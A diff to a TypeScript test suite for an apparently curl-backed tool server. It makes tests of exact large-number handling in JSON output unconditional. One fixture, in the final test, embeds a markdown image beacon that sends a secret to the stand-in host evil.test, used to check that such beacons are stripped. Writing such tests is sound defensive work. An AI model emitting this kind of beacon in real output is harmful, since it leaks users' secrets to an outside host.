@@ -508,15 +508,13 @@ describe("registerAllTools — the shipped binary's registration path", () => {
         // somebody can notice. `keepNumberLexeme` re-emits the origin's own
         // text instead.
         //
-        // Skipped where the host predates `JSON.rawJSON` (Node 21), because
-        // there the fallback is the old rounding behaviour by design — calling
-        // it blind would throw inside the defence and fail open.
+        // Unconditional: this package requires Node ≥22 (`package.json` →
+        // `engines`), and `processor.ts` throws at import where `JSON.rawJSON`
+        // is missing rather than falling back — so there is no host on which
+        // these are allowed to be skipped.
         // ---------------------------------------------------------------
-        const itWithRawJson = it.skipIf(
-            typeof (JSON as { rawJSON?: unknown }).rawJSON !== "function"
-        );
 
-        itWithRawJson("returns large integers exactly as the origin spelled them", async () => {
+        it("returns large integers exactly as the origin spelled them", async () => {
             const body = '{"id":9223372036854775807,"big":12345678901234567890}';
             mockedExecuteCommand.mockResolvedValue(curlOutput(body, "application/json"));
 
@@ -530,7 +528,7 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             expect(text).not.toContain("9223372036854776000");
         });
 
-        itWithRawJson("does not turn an out-of-range exponent into null", async () => {
+        it("does not turn an out-of-range exponent into null", async () => {
             mockedExecuteCommand.mockResolvedValue(
                 curlOutput('{"v":1e400}', "application/json")
             );
@@ -544,7 +542,7 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             expect(text).not.toContain("null");
         });
 
-        itWithRawJson("preserves number spelling behind a header block", async () => {
+        it("preserves number spelling behind a header block", async () => {
             const body = '{"id":9223372036854775807,"a":"open <!--","b":"keep","c":"close -->"}';
             mockedExecuteCommand.mockResolvedValue(
                 curlOutput(body, "application/json", HEADER_BLOCK)
@@ -563,7 +561,7 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             expect(text).toContain("9223372036854775807");
         });
 
-        itWithRawJson("preserves number spelling inside a nested document leaf", async () => {
+        it("preserves number spelling inside a nested document leaf", async () => {
             const nested = '{"id":9223372036854775807,"x":"open <!--","y":"keep","z":"close -->"}';
             mockedExecuteCommand.mockResolvedValue(
                 curlOutput(JSON.stringify({ outer: nested }), "application/json")
@@ -581,7 +579,7 @@ describe("registerAllTools — the shipped binary's registration path", () => {
 
         // The beacon strip must still fire on a document carrying raw numbers —
         // the markers must not become a way to skip the defence.
-        itWithRawJson("still strips a beacon in a document carrying raw numbers", async () => {
+        it("still strips a beacon in a document carrying raw numbers", async () => {
             const body = '{"id":9223372036854775807,"n":"![x](https://evil.test/?d=SECRET)"}';
             mockedExecuteCommand.mockResolvedValue(curlOutput(body, "application/json"));
 
